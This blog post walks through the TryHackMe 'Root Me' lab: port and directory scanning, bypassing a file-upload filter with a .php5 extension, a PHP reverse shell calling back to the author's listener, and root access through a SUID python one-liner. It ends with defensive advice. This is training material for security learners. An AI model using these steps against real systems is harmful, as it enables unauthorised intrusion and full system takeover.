@@ -1,0 +1,178 @@
+---
+layout: post
+title:  "[THM walkthrough] - Root Me"
+date:   2021-05-02 16:57:00 +0300
+tags: tryhackme easy writeup walkthrough
+categories: tryhackme
+---
+**Room URL**: <https://tryhackme.com/room/rrootme>
+
+**Difficulty**: Easy
+
+## RECONNAISSANCE
+
+I went ahead to get information about the target, focusing on the open ports and the services running on them. For this, I chose to use nmap.
+
+```
+$ nmap -vv -n -Pn -sV -oN services.nmap 10.10.234.224
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 15:09 EAT
+NSE: Loaded 45 scripts for scanning.
+Initiating Connect Scan at 15:09
+Scanning 10.10.234.224 [1000 ports]
+Discovered open port 22/tcp on 10.10.234.224
+Discovered open port 80/tcp on 10.10.234.224
+Increasing send delay for 10.10.234.224 from 0 to 5 due to 22 out of 72 dropped probes since last increase.
+Increasing send delay for 10.10.234.224 from 5 to 10 due to max_successful_tryno increase to 4
+Connect Scan Timing: About 42.85% done; ETC: 15:10 (0:00:41 remaining)
+Completed Connect Scan at 15:10, 83.97s elapsed (1000 total ports)
+Initiating Service scan at 15:10
+Scanning 2 services on 10.10.234.224
+Completed Service scan at 15:10, 7.00s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.234.224.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 15:10
+Completed NSE at 15:10, 10.33s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 15:10
+Completed NSE at 15:10, 2.46s elapsed
+Nmap scan report for 10.10.234.224
+Host is up, received user-set (0.45s latency).
+Scanned at 2021-05-02 15:09:08 EAT for 104s
+Not shown: 998 closed ports
+Reason: 998 conn-refused
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 104.27 seconds
+```
+
+Visiting the HTTP service in the browser, this is what was diplayed.
+
+![Web content on HTTP port 80](/assets/thm/rootme/http-port-in-browser.png)
+
+Since there was nothing interesting in the page source, I went ahead to do directory bruteforcing with GoBuster to find some interesting hidden directories as required.
+
+```
+$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.234.224 -o dirs           
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.234.224
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/05/02 15:19:51 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/css                  (Status: 301) [Size: 312] [--> http://10.10.234.224/css/]
+/index.php            (Status: 200) [Size: 616]                                
+/js                   (Status: 301) [Size: 311] [--> http://10.10.234.224/js/]
+/panel                (Status: 301) [Size: 314] [--> http://10.10.234.224/panel/]
+/server-status        (Status: 403) [Size: 278]                                  
+/uploads              (Status: 301) [Size: 316] [--> http://10.10.234.224/uploads/]
+
+===============================================================
+2021/05/02 15:24:06 Finished
+===============================================================
+```
+
+The `/panel/` directory looked interesting, so I decided to visit it. Visiting `http://10.10.234.224/panel/` in the browser, the below was displayed.
+
+![Panel directory web page](/assets/thm/rootme/panel-http-page.png)
+
+## GETTING A SHELL
+
+First, I tested the different files I could upload. I tested uploading `.txt` files and they were successfully uploaded. I tried `.php` files and they were rejected. So I tested with the different PHP file extensions i.e. `.php7` and `.php5`. The `.php7` files were accepted, but could not execute. The `.php5` files were successfully uploaded and could execute well.
+
+```
+$ cat test2.php5              
+<?php echo "It works"; ?>
+```
+
+![Uploading PHP5 test file](/assets/thm/rootme/test-php-file-upload.png)
+
+![Successful PHP5 test file execution](/assets/thm/rootme/successful-test-code-execution.png)
+
+So using this knowledge, I used the template PHP remote shell file provided in Kali Linux in `/usr/share/webshells/php/php-reverse-shell.php` and made the following adjustments to it.
+
+```
+line 49: $ip = '10.8.146.22';
+line 50: $port = 5555;
+```
+
+I proceeded to upload the shell as `about.php5` (how dubious! >:-} hahahahaaa). Before executing it, I setup my netcat listener to catch the remote shell. I then executed the file and acquired the shell.
+
+```
+$ nc -lvnp 5555                                  
+listening on [any] 5555 ...
+connect to [10.8.146.22] from (UNKNOWN) [10.10.234.224] 54070
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 13:08:13 up  1:06,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+
+Using the find command, I proceeded to get the user flag in `user.txt`.
+
+```
+$ find . -iname '*user.txt*' 2>/dev/null
+```
+
+## PRIVILEGE ESCALATION
+
+Using the find command, I found the files with SUID permissions as required.
+
+```
+$ find . -type f -perm -u+s 2>/dev/null   
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/snapd/snap-confine
+./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/openssh/ssh-keysign
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/bin/traceroute6.iputils
+./usr/bin/newuidmap
+./usr/bin/newgidmap
+./usr/bin/chsh
+./usr/bin/python
+./usr/bin/at
+./usr/bin/chfn
+./usr/bin/gpasswd
+./usr/bin/sudo
+./usr/bin/newgrp
+./usr/bin/passwd
+./usr/bin/pkexec
+<snip>
+./bin/fusermount
+./bin/ping
+./bin/umount
+```
+
+From the output, the `python` binary was looking off (normally, it would have no SUID permissions set), so I used it with the steps in <https://gtfobins.github.io/gtfobins/python/> to escalate my privileges and get the root flag in `root.txt`.
+
+```
+$ /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+
+## FINAL THOUGHTS
+
+### My Security Recommendations
+
+- Ensure to do thorough input validation and escaping when allowing any user to upload content to a web service.
+- If uploading content is necessary, implement user authentication, application jails and a WAF for the web service.
+- To view the content uploaded, set up output validation as well and escape any content so that it's not executable.
+- Setup endpoint security to monitor and alert on insecure executable permissions or permission changes.
